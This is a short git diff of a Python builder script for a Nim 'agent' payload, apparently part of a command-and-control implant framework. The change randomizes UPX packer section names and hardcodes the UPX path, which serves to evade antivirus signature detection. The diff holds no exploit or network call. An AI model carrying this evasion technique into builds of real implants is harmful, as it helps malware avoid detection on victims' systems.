@@ -7,9 +7,17 @@ except ModuleNotFoundError:
 
 import os
 import sys
+import string
+import secrets
 import argparse
 import subprocess
 from jsonc_parser.parser import JsoncParser
+
+def generate_random_string(length):
+    characters = string.ascii_letters + string.digits + string.punctuation
+    random_string = ''.join(secrets.choice(characters) for _ in range(length))
+    return random_string
+
 
 # compiler args
 nim_exe_cmd = "nim compile --app:gui"                 # exe format
@@ -23,6 +31,7 @@ nim_elf_flags = " "                                   # no need for now
 nim_global_flags = " -d:danger -d:strip --opt:size"   # for minimal size
 nim_global_flags += " --benchmarkVM:on"               # for NimProtect key randomization
 nim_in_out = " -o:OUT_FILE SRC_FILE"                  # for source and compiled file names
+
 
 # nimbo root folder
 nimbo_root = os.path.realpath(os.path.join(os.path.dirname(__file__), ".."))
@@ -43,8 +52,10 @@ default_elf = os.path.join(nimbo_root, config["agent"]["elf"]["agent_filename"])
 # upx command
 upx_cmd = "UPX_BIN OUT_BIN"
 upx_sections = {
-    b"UPX0": b"MIG4",
-    b"UPX1": b"MIG5"
+    b"UPX0": generate_random_string(4).encode(),
+    b"UPX1": generate_random_string(4).encode(),
+    b"UPX2": generate_random_string(4).encode(),
+    b"UPX!": generate_random_string(4).encode(),
 }
 
 
@@ -178,7 +189,7 @@ def main():
     args = parser.parse_args()
 
     if args.upx:
-        args.upx = config["builder"]["upx_path"]
+        args.upx = "upx"
 
     getattr(sys.modules[__name__], "build_" + args.payload_type)(args)
 
